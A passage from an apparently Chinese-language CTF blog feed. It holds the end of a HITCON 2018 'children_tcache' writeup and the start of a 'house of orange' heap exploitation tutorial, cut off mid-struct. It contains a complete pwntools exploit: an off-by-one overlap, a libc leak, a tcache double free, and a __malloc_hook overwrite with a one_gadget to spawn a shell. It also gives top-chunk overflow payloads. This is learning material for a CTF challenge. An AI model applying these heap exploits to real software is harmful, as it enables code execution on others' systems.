&#125;</span><br><span class="line">  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">  set_foot (remainder, remainder_size);</span><br><span class="line">  check_malloced_chunk (av, victim, nb);</span><br><span class="line">  <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>所以只要能把chunk_B作为last_remainder一切就简单了。详见wp</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./children_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./children_tcache'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_7_times</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(size, <span class="string">'xxxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_7_times</span><span class="params">(fr, to)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(fr, to):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#现在堆的前面把这些用于填充tcache的chunk分配好，以免破坏后面堆的布局</span></span><br><span class="line">add_7_times(<span class="number">0x80</span>) <span class="comment">#0-6</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x100</span>) <span class="comment">#0-6，填充tcache 0x110</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'7777'</span>) <span class="comment">#7 chunk_A</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'8888'</span>) <span class="comment">#8 chunk_B</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'9999'</span>) <span class="comment">#9 chunk_C</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">#释放chunk_B，tcache已满，放入unsortedbin</span></span><br><span class="line">dele(<span class="number">7</span>) <span class="comment">#释放chunk_A，A和B会合并(重要)</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x100</span>) <span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'7'</span>*<span class="number">0x108</span>) <span class="comment">#7 从合并的chunk中又取回chunk_A，同时创建了last_remainder(重要)</span></span><br><span class="line"><span class="comment">#同时通过溢出(null byte off_by_one)修改了chunk_B的size(0x110--&gt;0x100)，</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'8888'</span>) <span class="comment">#8 chunk_b1 从chunk_B(last_remainder)中分割下来，因为size被改，所以chunk_C的prevsize得不到维护</span></span><br><span class="line"><span class="comment">#此处如果不是从last_remainder中分割就会出错！！！！</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'aaaa'</span>) <span class="comment">#0 chunk_b2 将chunk_B剩下部分都取出来，chunk_C的prvesize同样没有被维护</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">#释放b1</span></span><br><span class="line">dele(<span class="number">9</span>) <span class="comment">#overlap!!触发从chunk_b1到topchunk的合并，其中包含了未被释放的chunk_b2</span></span><br><span class="line">        <span class="comment">#topchunk位于chunk_b1的位置。</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x80</span>) <span class="comment">#1-6 8</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'xxxx'</span>) <span class="comment">#9，重新分配chunk_b1，现在topchunk和chunk_b2重合</span></span><br><span class="line">del_7_times(<span class="number">1</span>, <span class="number">7</span>) <span class="comment">#回填tcache 0x90</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">#回填tcache 0x90，剩0(chunk_b2) 7(chunk_A) 9(chunk_b1)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">'1111'</span>) <span class="comment">#1，该chunk和0重合</span></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'2222'</span>) <span class="comment">#2，防止被topchunk合并</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#泄漏libc</span></span><br><span class="line">libc_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base: %#x"</span> % libc_base</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook: %#x"</span> % malloc_hook</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"one_gadget: %#x"</span> % one_gadget</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'1111'</span>) <span class="comment">#1 从0x500大小的chunk中分割出0x120。0和1都指向该chunk</span></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment">#放入tcache</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#再次放入tcache，double free</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>, p64(malloc_hook)) <span class="comment">#修改fd为malloc_hook</span></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'aaaa'</span>) </span><br><span class="line">add(<span class="number">0x120</span>, p64(one_gadget)) <span class="comment">#修改malloc_hook为one_gadget</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>) <span class="comment">#getshell</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/challenges/Hitcon2018/children_tcache/children_tcache.zip" target="_blank" rel="noopener">children_tcache</a><br>exp参考：<a href="https://xz.aliyun.com/t/2953" target="_blank" rel="noopener">HITCON2018-WP-By Nu1L</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> off_by_one </tag>
            
            <tag> overlapping </tag>
            
            <tag> tcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用学习之house of orange</title>
      <link href="/post/f8f8701e.html"/>
      <url>/post/f8f8701e.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用<code>unsorted attack</code>修改<code>_IO_list_all</code>指针，并伪造<code>_IO_FILE_plus</code>结构体及其<code>vtable</code>（虚表）来劫持控制流。<br>直接上题目好了。。。<br><a id="more"></a></p><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>程序菜单：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure><p></p><p>程序保护全开_(:зゝ∠)_:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br></pre></td></tr></table></figure><p></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><strong>build函数：</strong></p><blockquote><p>用户输入house的名字、orange的颜色和价格，并使用两个结构体保存。</p></blockquote><p>结构体：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> house           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> orange          dq ?</span><br><span class="line"><span class="number">00000008</span> name            dq ?</span><br><span class="line"><span class="number">00000010</span> house           ends</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> orange          struc ; (<span class="keyword">sizeof</span>=<span class="number">0x8</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> price           dd ?</span><br><span class="line"><span class="number">00000004</span> color           dd ?</span><br><span class="line"><span class="number">00000008</span> orange          ends</span><br></pre></td></tr></table></figure><p>限制了只能build四次，每次build会申请3个chunk，其中只有第二个chunk(house name)可以控制大小，且最大为0x1000<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">house = (house *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Length of name :"</span>);</span><br><span class="line">size = get_num();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    size = <span class="number">4096</span>;</span><br><span class="line">house-&gt;name = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !house-&gt;name )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Malloc error !!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Name :"</span>);</span><br><span class="line">get_str((<span class="keyword">void</span> *)house-&gt;name, size);</span><br><span class="line">orange = (orange *)<span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">8u</span>LL);</span><br></pre></td></tr></table></figure><p></p><p><strong>upgrade函数：</strong></p><blockquote><p>修改house的name、orange的颜色和价格，只能修改最近build的house。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Length of name :"</span>);</span><br><span class="line">v2 = get_num();</span><br><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0x1000</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">get_str((<span class="keyword">void</span> *)qword_203068[<span class="number">1</span>], v2);</span><br></pre></td></tr></table></figure><p>修改name的地方没有检查size的大小，所以存在<strong>堆溢出</strong></p><p><strong>see函数</strong></p><blockquote><p>打印house的名字、orange的价格等，同样只能打印最近build的house。</p></blockquote><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="泄露libc基址和堆地址"><a href="#泄露libc基址和堆地址" class="headerlink" title="泄露libc基址和堆地址"></a>泄露libc基址和堆地址</h2><p>发现程序中没有<code>free函数</code>，导致常规的堆利用方法都很难使用，这便是house of orange的核心之一——在没有free函数的情况下得到一个释放的堆块（unsorted bin），从而泄露数据。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>考虑这么一种情况，假设在malloc时，程序中的bins里都没有合适的chunk，同时<strong>top chunk的大小已经不够用来分配</strong>这块内存了。那么此时程序将会调用<code>sysmalloc</code>来向系统申请更多的空间，而我们的目的则是在<code>sysmalloc</code>中的<code>_int_free()</code>，以此来获得一块释放的堆块。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av); <span class="comment">//调用sysmalloc来分配内存</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>对于堆来说有两种拓展方式，一是通过改变brk来拓展堆，二是通过mmap的方式。其中只有<strong>brk拓展</strong>的方式才会调用到<code>_int_free()</code>将老的top chunk释放掉，所以还需要满足一些条件。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果所需分配的chunk大小大于mmap分配阈值，默认为128K，</span></span><br><span class="line"><span class="comment">// 并且当前进程使用mmap()分配的内存块小于设定的最大值</span></span><br><span class="line"><span class="comment">// 则将使用mmap()</span></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span> </span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//使用mmap()</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p></p><p>由上诉代码可知，要想使用brk拓展，需要满足<code>chunk size &lt; 0x‭20000‬</code><br>同时，在使用brk拓展之前，还会进行一系列check。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果top chunk没有初始化，则size为0</span></span><br><span class="line"><span class="comment">// top chunk的大小需要 &gt;= MINSIZE(有师傅的博客说在64位下是0x20)</span></span><br><span class="line"><span class="comment">// top chunk的inuse位需要是 1</span></span><br><span class="line"><span class="comment">// 检查是否对齐到内存页</span></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) </span><br><span class="line">        || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE </span><br><span class="line">        &amp;&amp; prev_inuse (old_top)</span><br><span class="line">        &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p></p><p>这里主要关注如何对齐到内存页。现代操作系统都是以内存页为单位进行内存管理的，一般内存页大小为4kb(0x1000)，那么top chunk的size加上top chunk的地址所得到的值是和0x1000对齐的。如：<code>0x602020+0x20fe0=0x623000</code>。</p><p>整理以上代码，<strong>所需的条件有</strong>：</p><blockquote><ul><li>分配的chunk大小小于0x‭20000，大于top chunk‬的size</li><li>top chunk大小大于 MINSIZE（不能太小就行）</li><li>top chunk的inuse为 1</li><li>top chunk的大小要对齐到内存页</li></ul></blockquote><p>满足了以上各种条件之后，就可以成功的调用<code>_int_free()</code>来释放top chunk<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If possible, release the rest. */</span></span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">&#123;</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);<span class="comment">//调用_int_free，free old_top。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>此后，原先的top chunk将被<strong>放入unsorted bin</strong>中。<br>下一次分配时，就将会<strong>从unsorted bin中切割</strong>合适的大小，而切割下来的chunk的fd和bk的值将会是<strong>libc中的地址</strong>了，同时，若该chunk是large chunk，在fd_nextsize和bk_nextsizez中还会储存<strong>堆中的地址</strong>。由此便可以<strong>完成泄露</strong>了。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>先build一个house，通过upgrade从name溢出到top chunk，将top chunk的大小改为<code>0xfa1</code>（name chunk的大小为0x20）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">upgrade(<span class="number">0x100</span>, payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存情况：</span></span><br><span class="line"><span class="number">0x55e0ebd68000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> &lt;== house</span><br><span class="line"><span class="number">0x55e0ebd68010</span>:<span class="number">0x000055e0ebd68050</span><span class="number">0x000055e0ebd68030</span></span><br><span class="line"><span class="number">0x55e0ebd68020</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> &lt;== name</span><br><span class="line"><span class="number">0x55e0ebd68030</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55e0ebd68040</span>:<span class="number">0x6161616161616161</span><span class="number">0x0000000000000021</span> &lt;== orange</span><br><span class="line"><span class="number">0x55e0ebd68050</span>:<span class="number">0x0000001f00000008</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e0ebd68060</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000fa1</span> &lt;== top chunk</span><br></pre></td></tr></table></figure></li><li><p>申请一个大于top chunk的空间，触发brk来拓展top chunk。原top chunk将会被放入unsorted bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="number">0x1000</span>, <span class="string">'aaaa'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存情况：</span></span><br><span class="line"><span class="comment">//因为我不是同一次运行，地址可能和前面不匹配</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x7f7ab34f37b8</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x5598255700a0</span> ◂— <span class="number">0x7f7ab34f37b8</span></span><br></pre></td></tr></table></figure></li><li><p>再申请一个大小合适的large chunk，该chunk将会从unsorted bin中切割下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="number">0x400</span>, <span class="string">'a'</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存情况：</span></span><br><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x559d1a1d40c0</span></span><br><span class="line"><span class="number">0x559d1a1d40c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x559d1a1d40d0</span>:<span class="number">0x6161616161616161</span><span class="number">0x00007f732b8fddc8</span> &lt;== libc</span><br><span class="line"><span class="number">0x559d1a1d40e0</span>:<span class="number">0x0000559d1a1d40c0</span><span class="number">0x0000559d1a1d40c0</span> &lt;== heap</span><br><span class="line"><span class="number">0x559d1a1d40f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li><li><p>调用see()，输出name时，将会把libc的地址泄露出来。再调用upgrade()，把bk也全部填充为’a’，那么下一次see()就可以泄露出heap的地址。</p></li></ol><h2 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h2><p>接下来将会涉及到IO_FILE的利用，这种方法被称为<strong>FSOP</strong>(File Stream Oriented Programming)</p><h3 id="FILE介绍"><a href="#FILE介绍" class="headerlink" title="FILE介绍"></a>FILE介绍</h3><blockquote><p>FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。FILE结构在程序执行fopen等函数时会进行创建。</p></blockquote><p>每个FILE结构都通过一个 <strong>_IO_FILE_plus</strong>结构体来定义，结构体如下：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p></p><p>其中包括一个<code>_IO_FILE</code>结构体和一个<code>vtable</code>(虚表)指针。<br><code>_IO_FILE</code>结构体保存了FILE的各种信息。<br><code>vtable</code>(虚表)指针指向了一系列函数指针，稍后就会用到其中的函数。</p><p><strong>_IO_FILE</strong>结构定义如下：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* 